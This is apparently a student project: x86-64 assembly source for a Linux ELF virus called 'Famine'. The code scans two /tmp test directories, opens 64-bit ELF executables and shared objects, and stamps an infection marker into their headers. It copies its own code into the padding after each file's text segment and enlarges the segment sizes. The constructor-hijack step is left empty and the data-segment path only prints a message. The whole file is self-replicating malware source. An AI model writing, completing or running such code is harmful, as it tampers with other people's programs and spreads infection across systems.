BITS 64

%include "defines.s"
virus_len equ _end - _start
virus_lenq equ (_end - _start) / 8 + 1

section .text
    global _start
_start:
    push    rbp
    mov     rbp, rsp
    lea     rdi, [rel dir1]
    call    readdir
    lea     rdi, [rel dir2]
    call    readdir
    xor     rdi, rdi
    mov     eax, SYS_EXIT
    syscall

; [rsp]         fd
; [rsp + 0x4]   buf_len
; [rsp + 0x8]   buffer
; [rsp + 0x10]  index
readdir:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20
    mov     rax, SYS_CHDIR
    syscall
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     eax, SYS_OPEN
    syscall
    mov     [rsp], eax

    xor     rdi, rdi
    mov     rsi, 0x1000
    mov     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
    mov     r8, -1
    xor     r9, r9
    mov     eax, SYS_MMAP
    syscall
    test    eax, eax
    jns      end_readdir
    mov     [rsp + 0x8], rax

loop_dir:
    mov     edi, [rsp]
    mov     rsi, [rsp + 0x8]
    mov     rdx, DIRENT_MAX_SIZE
    xor     eax, eax
    add     al, SYS_GETDENTS64
    syscall
    cmp     eax, 0
    jle     end_readdir
    mov     [rsp + 0x4], eax
    xor     r8, r8
loop_buf_dirent:
    mov     [rsp + 0x10], r8w
    mov     r9, [rsp + 0x8]
    cmp     BYTE [r9 + r8 + d_type], DT_REG
    jne     next_dirent
    lea     rdi, [r9 + r8 + d_name]
    call    infect
next_dirent:
    mov     r9, [rsp + 0x8]
    movzx   r8, WORD [rsp + 0x10]
    add     r8w, [r9 + d_reclen]
    cmp     r8w, [rsp + 4]
    jl      loop_buf_dirent
    jmp     loop_dir
end_readdir:
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    syscall
    leave
    ret

; [rsp]         fd
; [rsp + 4]     filename
; [rsp + 0xc]   file_size
; [rsp + 0x14]  e_hdr
; [rsp + 0x58]  map
; [rsp + 0x60]  text_phdr
; [rsp + 0x68]  data_phdr
; [rsp + 0x70]  old_entrypoint
; [rsp + 0x78]  old_text_size
; [rsp + 0x80]  base_payload_address
infect:
    push    rbp
    mov     rbp, rsp
    sub     rsp, STACK_FRAME_SIZE + 0x10 ; Let's be cautious 
    mov     [rsp + filename], rdi

    mov     esi, O_RDWR
    mov     eax, SYS_OPEN
    syscall
    test    eax, eax
    js      quit_infect

    mov     [rsp + fd], eax
    mov     edi, [rsp + fd]
    lea     rsi, [rsp + e_hdr]
    mov     rdx, ELFHDR_SIZE
    mov     eax, SYS_READ
    syscall

    lea     rbx, [rsp + e_hdr]
    lea     rax, [rbx + e_ident]
    cmp     [rax], DWORD ELF_MAGIC
    jne     close_quit_infect
    cmp     [rax + EI_CLASS], BYTE ELFCLASS64
    jne     close_quit_infect
    cmp     [rax + EI_DATA], BYTE ELFDATA2LSB
    jne     close_quit_infect
    cmp     [rax + EI_PAD], DWORD INFECTION_MAGIC
    je      close_quit_infect
    mov     rdx, [rax + e_phnum]
    test    rdx, rdx
    je      close_quit_infect
    mov     rdx, [rax + e_shnum]
    test    rdx, rdx
    je      close_quit_infect
    mov     ax, [rbx + e_type]
    cmp     ax, ET_EXEC
    je      right_type_check
    cmp     ax, ET_DYN
    jne     close_quit_infect

right_type_check:
    mov     edi, [rsp + fd]
    xor     rsi, rsi
    mov     rdx, SEEK_END
    mov     eax, SYS_LSEEK
    syscall
    add     rax, virus_len
    mov     [rsp + file_size], rax
    mov     rsi, rax
    xor     rdi, rdi
    mov     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_SHARED
    mov     r8d, [rsp + fd]
    xor     r9, r9
    mov     eax, SYS_MMAP
    syscall
    test    rax, rax
    je      close_quit_infect
    mov     [rsp + map], rax
    mov     edi, [rsp + fd]
    mov     eax, SYS_CLOSE
    syscall

    mov     rax, [rsp + map]
    mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection
    mov     rdx, QWORD [rax + e_entry]
    mov     [rsp + old_entrypoint], rdx

    mov     rax, [rsp + map]
    mov     r8, rax
    add     r8, [rax + e_phoff]
    mov     r9w, [rax + e_phnum]
    xor     r10, r10 ; index
loop_phdrs:
    cmp     [r8 + p_type], DWORD PT_LOAD
    jne     next_phdr
    cmp     [r8 + p_flags], DWORD PF_R | PF_X
    jne     comp_data
save_text_infos:
    mov     [rsp + text_phdr], r8
    mov     rdx, QWORD [r8 + p_filesz]
    mov     [rsp + old_text_size], rdx
comp_data:
    cmp     [r8 + p_flags], DWORD PF_R | PF_W
    jne     next_phdr
save_data_infos:
    mov     [rsp + data_phdr], r8
next_phdr:
    inc     r10
    add     r8w, [rax + e_phentsize]
    cmp     r10, r9
    jl      loop_phdrs

loop_sections:
    mov     rax, [rsp + map]
    mov     rbx, [rax + e_shoff]
    add     rbx, rax
    mov     rdx, [rsp + text_phdr]
    mov     rdx, [rdx + p_offset]
    add     rdx, QWORD [rsp + old_text_size]
    xor     r8, r8

test_last_text:
    mov     r9, QWORD [rbx + sh_offset]
    add     r9, QWORD [rbx + sh_size]
    cmp     r9, rdx
    jne     test_init_array
    mov     QWORD [rsp + last_text_shdr], rbx
test_init_array:
    mov     r9d, [rbx + sh_type]
    cmp     r9d, SHT_INIT_ARRAY
    jne     test_bss
    mov     QWORD [rsp + init_array_shdr], rbx
test_bss:
    cmp     r9d, SHT_NOBITS
    jne     next_section
    mov     QWORD [rsp + bss_shdr], rbx
next_section:
    inc     r8
    add     bx, [rax + e_shentsize]
    cmp     r8w, [rax + e_shnum]
    jle     test_last_text

check_text_padding:
    mov     r8, [rsp + text_phdr]
    mov     r9, [rsp + data_phdr]
    mov     rbx, [r8 + p_offset]
    add     rbx, [r8 + p_filesz]
    mov     rax, [r9 + p_offset]
    add     rax, [r9 + p_filesz]
    sub     rax, rbx
    cmp     rax, virus_len
    jle     remap_and_infect_data

    mov     rax, [rsp + text_phdr]
    mov     rdi, [rsp + map]
    add     rdi, [rax + p_offset]
    add     rdi, [rax + p_filesz]
    lea     rsi, [rel _start]
    mov     rcx, virus_lenq
copy_payload:
    lodsq
    stosq
    loop    copy_payload
increase_text_size:
    mov     rax, [rsp + text_phdr]
    add     QWORD [rax + p_filesz], virus_len
    add     QWORD [rax + p_memsz], virus_len
    mov     rax, [rsp + last_text_shdr]
    add     QWORD [rax + sh_size], virus_len
    jmp     hijack_constructor

remap_and_infect_data:
    mov     edi, 1
    lea     rsi, [rel data_tmp_text]
    mov     rdx, data_tmp_text.len
    mov     eax, SYS_WRITE
    syscall
    
hijack_constructor:


munmap_quit_infect:
    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     eax, SYS_MSYNC
    syscall

    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     eax, SYS_MUNMAP
    syscall

close_quit_infect:
    mov     edi, [rsp + fd]
    mov     eax, SYS_CLOSE
    syscall
quit_infect:
    leave
    ret

    dir1: db "/tmp/test/", 0
    dir2: db "/tmp/test2/", 0
    old_entry_code: TIMES 5 db 0
    signature: db "Famine version 1.0 (c)oded by alagroy-", 0
    data_tmp_text: db "Remapping and infecting .data", 10
        .len: equ $ - data_tmp_text
_end: